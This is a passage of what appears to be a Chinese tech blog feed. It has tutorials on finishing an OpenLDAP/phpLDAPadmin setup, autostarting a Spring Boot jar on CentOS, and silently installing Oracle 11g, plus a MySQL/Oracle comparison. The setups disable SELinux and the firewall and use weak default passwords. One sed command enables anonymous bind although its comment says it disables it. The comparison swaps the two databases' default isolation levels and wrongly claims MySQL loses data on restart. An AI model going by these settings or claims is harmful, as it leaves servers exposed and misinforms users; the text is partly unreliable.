<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">新增配置文件</span></span><br><span class="line">[root@openldap-server ~]# cat &gt; base.ldif &lt;&lt;-EOF</span><br><span class="line">dn: dc=lianglong,dc=com</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: dcObject</span><br><span class="line">objectClass: organization</span><br><span class="line">o: lianglong Company</span><br><span class="line">dc: lianglong</span><br><span class="line"></span><br><span class="line">dn: cn=admin,dc=lianglong,dc=com</span><br><span class="line">objectClass: organizationalRole</span><br><span class="line">cn: admin</span><br><span class="line"></span><br><span class="line">dn: ou=People,dc=lianglong,dc=com</span><br><span class="line">objectClass: organizationalUnit</span><br><span class="line">ou: People</span><br><span class="line"></span><br><span class="line">dn: ou=Group,dc=lianglong,dc=com</span><br><span class="line">objectClass: organizationalRole</span><br><span class="line">cn: Group</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">这点的密码是原始的密码，我的是123456，切记命令中的dc需要修改成自己的</span></span><br><span class="line">[root@localhost ~]# ldapadd -x -D cn=admin,dc=lianglong,dc=com -W -f base.ldif</span><br><span class="line">Enter LDAP Password: </span><br><span class="line">adding new entry "dc=lianglong,dc=com"</span><br><span class="line"></span><br><span class="line">adding new entry "cn=admin,dc=lianglong,dc=com"</span><br><span class="line"></span><br><span class="line">adding new entry "ou=People,dc=lianglong,dc=com"</span><br><span class="line"></span><br><span class="line">adding new entry "ou=Group,dc=lianglong,dc=com"</span><br><span class="line"><span class="meta">#</span><span class="bash">通过以上的所有步骤，我们就设置好了一个 LDAP 目录树：其中基准 dc=lianglong,dc=com 是该树的根节点，其下有一个管理域 cn=admin,dc=lianglong,dc=com 和两个组织单元 ou=People,dc=lianglong,dc=com 及 ou=Group,dc=lianglong,dc=com。</span></span><br></pre></td></tr></table></figure>

<p>3.安装PHP5</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# rpm -Uvh https://mirror.webtatic.com/yum/el7/epel-release.rpm</span><br><span class="line">[root@localhost ~]# rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</span><br><span class="line">[root@localhost ~]# yum install php55w.x86_64 php55w-cli.x86_64 php55w-common.x86_64 php55w-gd.x86_64 php55w-ldap.x86_64 php55w-mbstring.x86_64 php55w-mcrypt.x86_64 php55w-mysql.x86_64 php55w-pdo.x86_64 --skip-broken</span><br></pre></td></tr></table></figure>

<h3 id="4-安装phpldapadmin"><a href="#4-安装phpldapadmin" class="headerlink" title="4.安装phpldapadmin"></a>4.安装phpldapadmin</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 注意： phpldapadmin很多没更新了，只支持php5，如果你服务器的环境是php7，则会有问题，页面会有各种报错</span></span><br><span class="line">[root@localhost ~]# yum install -y phpldapadmin</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改apache的phpldapadmin配置文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改如下内容，centos7 默认安装的apache为2.4版本。所以只需要改2.4版本的配置就可以了</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果不知道自己apache版本，执行 rpm -qa|grep httpd 查看apache版本</span></span><br><span class="line"> </span><br><span class="line">[root@localhost ~]# cat /etc/httpd/conf.d/phpldapadmin.conf</span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash">  Web-based tool <span class="keyword">for</span> managing LDAP servers</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line">Alias /phpldapadmin /usr/share/phpldapadmin/htdocs</span><br><span class="line">Alias /ldapadmin /usr/share/phpldapadmin/htdocs</span><br><span class="line"></span><br><span class="line">&lt;Directory /usr/share/phpldapadmin/htdocs&gt;</span><br><span class="line">  &lt;IfModule mod_authz_core.c&gt;</span><br><span class="line">    # Apache 2.4</span><br><span class="line">    Require all granted</span><br><span class="line">  &lt;/IfModule&gt;</span><br><span class="line">  &lt;IfModule !mod_authz_core.c&gt;</span><br><span class="line">    # Apache 2.2</span><br><span class="line">    Order Deny,Allow</span><br><span class="line">    Deny from all</span><br><span class="line">    Allow from 127.0.0.1</span><br><span class="line">    Allow from ::1</span><br><span class="line">  &lt;/IfModule&gt;</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改配置用DN登录ldap</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 398行，默认是使用uid进行登录，我这里改为cn，也就是用户名</span></span><br><span class="line">[root@localhost ~]# sed -i '398c $servers-&gt;setValue('login','attr','cn');' /etc/phpldapadmin/config.php</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 460行，关闭匿名登录，否则任何人都可以直接匿名登录查看所有人的信息</span></span><br><span class="line">[root@localhost ~]# sed -i '460c $servers-&gt;setValue('login','anon_bind',true);' /etc/phpldapadmin/config.php </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 519行，设置用户属性的唯一性，这里我将cn,sn加上了，以确保用户名的唯一性</span></span><br><span class="line">[root@localhost ~]# sed -i '519c $servers-&gt;setValue('unique','attrs',array('mail','uid','uidNumber','cn','sn'));' /etc/phpldapadmin/config.php </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动apache</span></span><br><span class="line">systemctl start httpd</span><br><span class="line">systemctl enable httpd</span><br></pre></td></tr></table></figure>

<h3 id="5-访问"><a href="#5-访问" class="headerlink" title="5.访问"></a>5.访问</h3><p>网页输入<code>ip/ldapadmin</code></p>
<p><img src= "/img/loading.gif" data-src="/2019/07/12/CentOS7%E4%B8%8BOpenLDAP+PhpLdapAdmin%E5%9F%BA%E6%9C%AC%E5%AE%89%E8%A3%85/image-20200821150814525.png" alt="image-20200821150814525"></p>
<p>cn是你文件里面设置的</p>
<p><img src= "/img/loading.gif" data-src="/2019/07/12/CentOS7%E4%B8%8BOpenLDAP+PhpLdapAdmin%E5%9F%BA%E6%9C%AC%E5%AE%89%E8%A3%85/image-20200821150828045.png" alt="image-20200821150828045"></p>
]]></content>
      <categories>
        <category>PhpLdapAdmin</category>
      </categories>
      <tags>
        <tag>PhpLdapAdmin</tag>
        <tag>OpenLDAP</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos 6 部署springboot项目jar包开机自启</title>
    <url>/2020/09/11/Centos%206%20%E9%83%A8%E7%BD%B2springboot%E9%A1%B9%E7%9B%AEjar%E5%8C%85%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Centos-6-部署springboot项目jar包开机自启"><a href="#Centos-6-部署springboot项目jar包开机自启" class="headerlink" title="Centos 6 部署springboot项目jar包开机自启"></a>Centos 6 部署springboot项目jar包开机自启</h1><p>Linux下部署springboot项目jar包开机自启</p>
<p>Linux版本 Centos7详细步骤如下：</p>
<p>1、在/etc/init.d/目录下创建shell启动脚本autojar.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/init.d/</span><br><span class="line">touch autojar.sh</span><br><span class="line"></span><br><span class="line">vi autojar.sh</span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> chkconfig: 2345 85 15 </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> description:auto_run</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">程序名</span></span><br><span class="line">RUN_NAME="demo-0.0.1-SNAPSHOT.jar"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">jar包位置</span></span><br><span class="line">JAVA_OPTS=/opt/jar/demo-0.0.1-SNAPSHOT.jar</span><br><span class="line">LOG_OPTS=/opt/log/demo.log</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">开始方法</span></span><br><span class="line">start() &#123;</span><br><span class="line">        nohup java -jar $JAVA_OPTS &gt;$LOG_OPTS 2&gt;&amp;1 &amp;</span><br><span class="line">        echo "$RUN_NAME started success."</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">结束方法</span></span><br><span class="line">stop() &#123;</span><br><span class="line">        echo "stopping $RUN_NAME ..."</span><br><span class="line">        kill -9 `ps -ef|grep $JAVA_OPTS|grep -v grep|grep -v stop|awk '&#123;print $2&#125;'`</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">case "$1" in</span><br><span class="line">        start)</span><br><span class="line">            start</span><br><span class="line">            ;;</span><br><span class="line">        stop)</span><br><span class="line">            stop</span><br><span class="line">            ;;</span><br><span class="line">        restart)</span><br><span class="line">            stop</span><br><span class="line">            start</span><br><span class="line">            ;;</span><br><span class="line">        *)</span><br><span class="line">                echo "Userage: $0 &#123;start|stop|restart&#125;"</span><br><span class="line">                exit 1</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<p>2、设置执行权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x /etc/init.d/autojar.sh</span><br><span class="line">chmod +x /opt/jar/demo-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>

<p>3、添加到chkconfig作为系统服务，并设置开机启动：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chkconfig --add autojar.sh   (添加为系统服务)</span><br><span class="line">chkconfig autojar.sh on  （开机自启动）</span><br><span class="line">service autojar.sh start（启动服务）</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -ntlp | grep 8080 （查看端口）</span><br><span class="line">ps aux|grep java（查看服务）</span><br></pre></td></tr></table></figure>

<p>至此重启系统看看是否成功。</p>
]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>springboot</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos 7 安装ORACLE</title>
    <url>/2020/09/03/Centos%207%20%E5%AE%89%E8%A3%85%E5%8D%95%E8%8A%82%E7%82%B9ORACLE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>[TOC]</p>
<h1 id="Centos-7-安装ORACLE"><a href="#Centos-7-安装ORACLE" class="headerlink" title="Centos 7 安装ORACLE"></a>Centos 7 安装ORACLE</h1><h2 id="oracle-和-mysql的区别"><a href="#oracle-和-mysql的区别" class="headerlink" title="oracle 和 mysql的区别"></a>oracle 和 mysql的区别</h2><blockquote>
<p><strong>(1) 对事务的提交</strong><br>   MySQL默认是自动提交，而Oracle默认不自动提交，需要用户手动提交，需要在写commit;指令或者点击commit按钮<br><strong>(2) 分页查询</strong><br>   MySQL是直接在SQL语句中写”select… from …where…limit x, y”,有limit就可以实现分页;而Oracle则是需要用到伪列ROWNUM和嵌套查询<br><strong>(3) 事务隔离级别</strong><br>    MySQL是read commited的隔离级别，而Oracle是repeatable read的隔离级别，同时二者都支持serializable串行化事务隔离级别，可以实现最高级别的<br>   读一致性。每个session提交后其他session才能看到提交的更改。Oracle通过在undo表空间中构造多版本数据块来实现读一致性，每个session<br>   查询时，如果对应的数据块发生变化，Oracle会在undo表空间中为这个session构造它查询时的旧的数据块<br>  MySQL没有类似Oracle的构造多版本数据块的机制，只支持read commited的隔离级别。一个session读取数据时，其他session不能更改数据，但<br>   可以在表最后插入数据。session更新数据时，要加上排它锁，其他session无法访问数据<br><strong>(4) 对事务的支持</strong><br>   MySQL在innodb存储引擎的行级锁的情况下才可支持事务，而Oracle则完全支持事务<br><strong>(5) 保存数据的持久性</strong><br>   MySQL是在数据库更新或者重启，则会丢失数据，Oracle把提交的sql操作线写入了在线联机日志文件中，保持到了磁盘上，可以随时恢复<br><strong>(6) 并发性</strong><br>   MySQL以表级锁为主，对资源锁定的粒度很大，如果一个session对一个表加锁时间过长，会让其他session无法更新此表中的数据。<br> 虽然InnoDB引擎的表可以用行级锁，但这个行级锁的机制依赖于表的索引，如果表没有索引，或者sql语句没有使用索引，那么仍然使用表级锁。<br> Oracle使用行级锁，对资源锁定的粒度要小很多，只是锁定sql需要的资源，并且加锁是在数据库中的数据行上，不依赖与索引。所以Oracle对并发性的支持要好很多。<br> <strong>(7) 逻辑备份</strong><br>MySQL逻辑备份时要锁定数据，才能保证备份的数据是一致的，影响业务正常的dml使用,Oracle逻辑备份时不锁定数据，且备份的数据是一致<br>   <strong>(8) 复制</strong><br>MySQL:复制服务器配置简单，但主库出问题时，丛库有可能丢失一定的数据。且需要手工切换从库到主库。<br>   Oracle:既有推或拉式的传统数据复制，也有dataguard的双机或多机容灾机制，主库出现问题是，可以自动切换备库到主库，但配置管理较复杂。<br>   <strong>(9) 性能诊断</strong><br>MySQL的诊断调优方法较少，主要有慢查询日志。<br>   Oracle有各种成熟的性能诊断调优工具，能实现很多自动分析、诊断功能。比如awr、addm、sqltrace、tkproof等<br>   <strong>(10)权限与安全</strong><br>MySQL的用户与主机有关，感觉没有什么意义，另外更容易被仿冒主机及ip有可乘之机。<br>   Oracle的权限与安全概念比较传统，中规中矩。<br>   <strong>(11)分区表和分区索引</strong><br>MySQL的分区表还不太成熟稳定。<br>   Oracle的分区表和分区索引功能很成熟，可以提高用户访问db的体验。<br>   <strong>(12)管理工具</strong><br>MySQL管理工具较少，在linux下的管理工具的安装有时要安装额外的包（phpmyadmin， etc)，有一定复杂性。<br>   Oracle有多种成熟的命令行、图形界面、web管理工具，还有很多第三方的管理工具，管理极其方便高效。<br>   <strong>(13)最重要的区别</strong><br>MySQL是轻量型数据库，并且免费，没有服务恢复数据。<br>   Oracle是重量型数据库，收费，Oracle公司对Oracle数据库有数据恢复服务。</p>
</blockquote>
<h3 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">将oracle11G 的软件包上传到服务器/tmp目录，并解压：</span><br><span class="line">[root@oracle ~]# unzip  p13390677_112040_Linux-x86-64_1of7.zip</span><br><span class="line">[root@oracle ~]# unzip  p13390677_112040_Linux-x86-64_2of7.zip</span><br><span class="line">关闭selinux，设置SELINUX= enforcing 为SELINUX=disabled</span><br><span class="line"></span><br><span class="line">关闭防火墙</span><br><span class="line">停止防火墙：systemctl stop firewalld</span><br><span class="line">关闭自启动防火墙服务：systemctl disable firewalld</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">修改主机名</span><br><span class="line">[root@oracle ~]# hostnamectl set-hostname oracle</span><br><span class="line"></span><br><span class="line">做本地解析(必须做，不然后面会报错)</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.200.147 oracle</span><br><span class="line"></span><br><span class="line">ping oracle</span><br></pre></td></tr></table></figure>



<h3 id="二、安装依赖包"><a href="#二、安装依赖包" class="headerlink" title="二、安装依赖包"></a>二、安装依赖包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 建议先检测哪些包没有安装</span></span><br><span class="line"></span><br><span class="line">[root@oracle ~]# yum -y install gcc make binutils gcc-c++ compat-libstdc++-33 elfutils-libelf-devel elfutils-libelf-devel-static ksh libaio libaio-devel numactl-devel sysstat unixODBC unixODBC-devel pcre-devel</span><br><span class="line"></span><br><span class="line">如果不能连网，可以先下载安装包copy到服务器，用rpm命令安装。不同系统版本的依赖包版本不一致，安装时需要下载对应版本的，以免安装失败。</span><br><span class="line">检查是否全部安装上</span><br><span class="line">rpm -q \</span><br><span class="line">binutils \</span><br><span class="line">compat-libstdc++-33 \</span><br><span class="line">elfutils-libelf \</span><br><span class="line">elfutils-libelf-devel \</span><br><span class="line">expat \</span><br><span class="line">gcc \</span><br><span class="line">gcc-c++ \</span><br><span class="line">glibc \</span><br><span class="line">glibc-common \</span><br><span class="line">glibc-devel \</span><br><span class="line">glibc-headers \</span><br><span class="line">libaio \</span><br><span class="line">libaio-devel \</span><br><span class="line">libgcc \</span><br><span class="line">libstdc++ \</span><br><span class="line">libstdc++-devel \</span><br><span class="line">make \</span><br><span class="line">pdksh \</span><br><span class="line">sysstat \</span><br><span class="line">unixODBC \</span><br><span class="line">unixODBC-devel | grep "not installed"</span><br></pre></td></tr></table></figure>



<h3 id="三、环境配置"><a href="#三、环境配置" class="headerlink" title="三、环境配置"></a>三、环境配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1、创建用户组</span><br><span class="line">[root@oracle ~]# groupadd oinstall</span><br><span class="line">[root@oracle ~]# groupadd dba</span><br><span class="line"></span><br><span class="line">2、输入命令 useradd -g oinstall -G dba -m oracle 创建oracle用户，并加入到oinstall和dba用户组</span><br><span class="line">[root@oracle ~]# useradd -g oinstall -G dba -m oracle</span><br><span class="line"></span><br><span class="line">3、修改oracle 密码</span><br><span class="line">[root@oracle ~]# passwd oracle</span><br><span class="line">设置oracle用户对应的密码</span><br><span class="line"></span><br><span class="line">4、修改内核参数</span><br><span class="line">[root@oracle ~]# vim /etc/sysctl.conf</span><br><span class="line">net.ipv4.icmp_echo_ignore_broadcasts = 1</span><br><span class="line">net.ipv4.conf.all.rp_filter = 1</span><br><span class="line">fs.file-max = 6815744 #设置最大打开文件数</span><br><span class="line">fs.aio-max-nr = 1048576</span><br><span class="line">kernel.shmall = 2097152 #共享内存的总量</span><br><span class="line">kernel.shmmax = 1073741824 #最大共享内存的段大小</span><br><span class="line">kernel.shmmni = 4096 #整个系统共享内存端的最大数</span><br><span class="line">kernel.sem = 250 32000 100 128</span><br><span class="line">net.ipv4.ip_local_port_range = 9000 65500 #可使用的IPv4端口范围</span><br><span class="line">net.core.rmem_default = 262144</span><br><span class="line">net.core.rmem_max= 4194304</span><br><span class="line">net.core.wmem_default= 262144</span><br><span class="line">net.core.wmem_max= 1048576</span><br><span class="line"></span><br><span class="line">[root@oracle ~]# sysctl -p # 生效配置</span><br><span class="line"></span><br><span class="line">5、修改软硬件限制</span><br><span class="line">[root@oracle ~]# vim /etc/security/limits.conf </span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加以下配置：</span></span><br><span class="line"></span><br><span class="line">oracle	soft	nproc	2047</span><br><span class="line">oracle	hard	nproc	16384</span><br><span class="line">oracle	soft	nofile	1024</span><br><span class="line">oracle	hard	nofile	65536</span><br><span class="line">oracle	soft	stack	10240</span><br><span class="line">oracle	hard	stack	10240</span><br><span class="line"></span><br><span class="line">6、修改/etc/pam.d/login文件</span><br><span class="line">[root@oracle ~]# vim /etc/pam.d/login</span><br><span class="line"><span class="meta">#</span><span class="bash">添加：</span></span><br><span class="line">session  required   pam_limits.so</span><br><span class="line">session  required   /lib64/security/pam_limits.so</span><br><span class="line"></span><br><span class="line">7、执行命令：</span><br><span class="line">[root@oracle ~]# vim /etc/profile</span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加：</span></span><br><span class="line"></span><br><span class="line">if [ $USER = "oracle" ]; then</span><br><span class="line">    if [ $SHELL = "/bin/ksh" ]; then</span><br><span class="line">        ulimit -p 16384</span><br><span class="line">        ulimit -n 65536</span><br><span class="line">    else</span><br><span class="line">        ulimit -u 16384 -n 65536</span><br><span class="line">    fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">[root@oracle ~]# source /etc/profile</span><br><span class="line"></span><br><span class="line">8、创建目录</span><br><span class="line">mkdir -p /data/oracle/product/11.2.0</span><br><span class="line">mkdir /data/oracle/oradata</span><br><span class="line">mkdir /data/oracle/inventory</span><br><span class="line">mkdir /data/oracle/fast_recovery_area</span><br><span class="line">chown -R oracle:oinstall /data/oracle</span><br><span class="line">chmod -R 775 /data/oracle</span><br><span class="line"></span><br><span class="line">9、配置环境变量：</span><br><span class="line">[root@oracle ~]# vim /home/oracle/.bash_profile</span><br><span class="line">ORACLE_BASE=/data/oracle</span><br><span class="line">ORACLE_HOME=$ORACLE_BASE/product/11.2.0</span><br><span class="line">ORACLE_SID=orcl</span><br><span class="line">PATH=$PATH:$ORACLE_HOME/bin</span><br><span class="line">export ORACLE_BASE ORACLE_HOME ORACLE_SID PATH</span><br><span class="line">export NLS_LANG=AMERICAN_AMERICA.AL32UTF8</span><br><span class="line">export NLS_DATE_FORMAT='yyyy-mm-dd hh24:mi:ss'</span><br><span class="line">stty erase ^h</span><br><span class="line">[root@oracle ~]# source /home/oracle/.bash_profile</span><br><span class="line"></span><br><span class="line">10、编辑静默安装相应文件，可以替换下面文件，修改ORACLE_HOSTNAME为主机名称。</span><br><span class="line"></span><br><span class="line">[root@oracle ~]# vim /tmp/database/response/db_install.rsp</span><br><span class="line">修改参数：</span><br><span class="line"> </span><br><span class="line">oracle.install.option=INSTALL_DB_SWONLY</span><br><span class="line">ORACLE_HOSTNAME=oracle</span><br><span class="line">UNIX_GROUP_NAME=oinstall</span><br><span class="line">INVENTORY_LOCATION=/data/oracle/inventory</span><br><span class="line">SELECTED_LANGUAGES=en,zh_CN</span><br><span class="line">ORACLE_HOME=/data/oracle/product/11.2.0</span><br><span class="line">ORACLE_BASE=/data/oracle</span><br><span class="line">oracle.install.db.InstallEdition=EE</span><br><span class="line">oracle.install.db.DBA_GROUP=dba</span><br><span class="line">oracle.install.db.OPER_GROUP=dba</span><br><span class="line">DECLINE_SECURITY_UPDATES=true</span><br><span class="line"></span><br><span class="line">安装数据库监听</span><br><span class="line">su - oracle</span><br><span class="line">cd /tmp/database</span><br><span class="line">[root@oracle ~]# ./runInstaller -silent -force -ignorePrereq -responseFile /tmp/database/response/db_install.rsp</span><br><span class="line"></span><br><span class="line">如果这里报错，可以查看下是否有swap分区</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/04/13/u9EkGNYQsiF6pan.png" alt="image-20200412162828829"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">swapon -s 为空就没有</span><br><span class="line">解决：</span><br><span class="line">创建并允许 Swap 文件下面使用 dd 命令来创建 Swap 文件</span><br><span class="line">dd if=/dev/zero of=/swapfile bs=1024 count=512k</span><br><span class="line">格式化并激活 Swap 文件上面已经创建好 Swap 文件，还需要格式化后才能使用</span><br><span class="line">mkswap /swapfile</span><br><span class="line">激活 Swap</span><br><span class="line">swapon /swapfile</span><br><span class="line"></span><br><span class="line">11、在root用户下运行脚本</span><br><span class="line">exit</span><br><span class="line">sh /data/oracle/inventory/orainstRoot.sh</span><br><span class="line">sh /data/oracle/product/11.2.0/root.sh</span><br><span class="line"></span><br><span class="line">12、用oracle用户登录配置监听</span><br><span class="line">netca -silent -responseFile /tmp/database/response/netca.rsp</span><br></pre></td></tr></table></figure>

 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">正确结果:</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/04/13/iWV2MKIUQ7zy6RA.png" alt="image-20200413112748886"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root用户查看监听端口： netstat -tnulp | grep 1521</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">建立新库和实例</span><br><span class="line">切换到root用户，执行命令： vim /tmp/database/response/dbca.rsp </span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改参数：</span></span><br><span class="line">GDBNAME = "orcl"</span><br><span class="line">SID = "orcl"</span><br><span class="line">SYSPASSWORD = "oracle"</span><br><span class="line">SYSTEMPASSWORD = "oracle"</span><br><span class="line">SYSMANPASSWORD = "oracle"</span><br><span class="line">DBSNMPPASSWORD = "oracle"</span><br><span class="line">DATAFILEDESTINATION =/data/oracle/oradata</span><br><span class="line">RECOVERYAREADESTINATION=/data/oracle/fast_recovery_area</span><br><span class="line">CHARACTERSET = "ZHS16GBK"</span><br><span class="line">TOTALMEMORY = "1638"</span><br></pre></td></tr></table></figure>


<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">13、静默配置安装</span><br><span class="line">[root@oracle ~]# su - oracle</span><br><span class="line">[oracle@oracle ~]$ dbca -silent -responseFile /tmp/database/response/dbca.rsp</span><br><span class="line">[oracle@oracle ~]$ cp /data/oracle/product/11.2.0/assistants/dbca/templates/Seed_Database.dfb /data/oracle/oradata/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下面错误，无法找到Seed_Database.dfb 文件，在root下find出文件路径拷贝即可</span></span><br><span class="line">The file "/data/oracle/oradata/Seed_Database.dfb" containing the datafiles information is not found. Please specify a valid file.</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/04/13/b7sDjHnmAtpBQlF.png" alt="image-20200412195346762"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">完成建库后进行实例检查：</span><br><span class="line">[root@oracle ~]# ps -ef | grep ora_ | grep -v grep</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/04/13/PuJIqorNaOHDLsS.png" alt="image-20200412195424592"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看监听状态:lsnrctl status</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/04/13/2EM7CL8cVNqARKS.png" alt="image-20200412195442766"></p>
<h3 id="四、登录后测试"><a href="#四、登录后测试" class="headerlink" title="四、登录后测试"></a>四、登录后测试</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">登录方式：</span><br><span class="line">- 以操作系统权限认证的oracle sys管理员登陆</span><br><span class="line">sqlplus / as sysdba</span><br><span class="line">- 不在cmd或者terminal当中暴露密码的登陆方式</span><br><span class="line">sqlplus /nolog</span><br><span class="line"><span class="meta">SQL&gt;</span><span class="bash"> conn /as sysdba </span></span><br><span class="line">或者</span><br><span class="line">sqlplus /nolog</span><br><span class="line"><span class="meta">SQL&gt;</span><span class="bash"> conn sys/password as sysdba</span></span><br><span class="line">- 非管理员用户登陆</span><br><span class="line">sqlplus user/password</span><br><span class="line">- 非管理员用户使用tns别名登陆</span><br><span class="line">sqlplus user/password@orcl </span><br><span class="line">- 管理员用户使用tns别名登陆</span><br><span class="line">sqlplus sys/password@orcl as sysdba</span><br><span class="line"></span><br><span class="line">1、登录查看实例状态</span><br><span class="line">sqlplus / as sysdba  # 登录</span><br><span class="line"><span class="meta">SQL&gt;</span><span class="bash"> startup <span class="comment"># 启动服务  关闭用 shutdown</span></span></span><br><span class="line">错误1：ORA-01081  # 服务已启动</span><br><span class="line"></span><br><span class="line">错误2：LRM-00109  # cp /u01/app/oracle/admin/orcl/pfile/init.ora.一串数字 /u01/app/oracle/product/11.2.0/dbs/initorcl.ora</span><br><span class="line">解决方法参考：http://yesican.blog.51cto.com/700694/471052</span><br><span class="line"></span><br><span class="line">错误3：LRM-01102  # 可以尝试重启机器得到解决，重启后报错可以参考：http://blog.csdn.net/lzwgood/article/details/26368323</span><br><span class="line"></span><br><span class="line">2、sqlplus中无法退格和上下翻动历史命令的解决办法</span><br><span class="line">安装rlwrap</span><br><span class="line">[root@oracle11g ~]# yum -y install readline* libXtst-devel</span><br><span class="line">[root@oracle11g ~]# tar -zxvf rlwrap-0.37.tar.gz</span><br><span class="line">[root@oracle11g ~]# cd rlwrap-0.37</span><br><span class="line">[root@oracle11g rlwrap-0.38]# ./configure</span><br><span class="line">[root@oracle11g rlwrap-0.38]# make</span><br><span class="line">[root@oracle11g rlwrap-0.38]# make install</span><br><span class="line">[oracle@oracle ~]$ vim /home/oracle/.bash_profile</span><br><span class="line">stty erase ^h</span><br><span class="line">alias sqlplus='rlwrap sqlplus'</span><br><span class="line">alias rman='rlwrap rman'</span><br><span class="line">Linux下的SQL Plus 终于可以像Windows下的那样使用了。</span><br></pre></td></tr></table></figure>



<h3 id="五、sql基础"><a href="#五、sql基础" class="headerlink" title="五、sql基础"></a>五、sql基础</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">创建表空间：</span><br><span class="line">格式: <span class="keyword">create</span> <span class="keyword">tablespace</span> 表空间名 <span class="keyword">datafile</span> <span class="string">'数据文件名'</span> <span class="keyword">size</span> 表空间大小</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">tablespace</span> data_test <span class="keyword">datafile</span> <span class="string">'/data/oracle/oradata/orcl/data1.dbf'</span> <span class="keyword">size</span> <span class="number">2000</span>M;</span><br><span class="line"></span><br><span class="line">创建用户（密码使用双引号）：</span><br><span class="line">格式: <span class="keyword">create</span> <span class="keyword">user</span> 用户名 <span class="keyword">identified</span> <span class="keyword">by</span> 密码 <span class="keyword">default</span> <span class="keyword">tablespace</span> 表空间表;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> study <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">"test"</span> <span class="keyword">default</span> <span class="keyword">tablespace</span> data_test;</span><br><span class="line"></span><br><span class="line">授权：</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">connect</span>,<span class="keyword">resource</span> <span class="keyword">to</span> study;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">create</span> <span class="keyword">session</span> <span class="keyword">to</span> study;</span><br><span class="line"></span><br><span 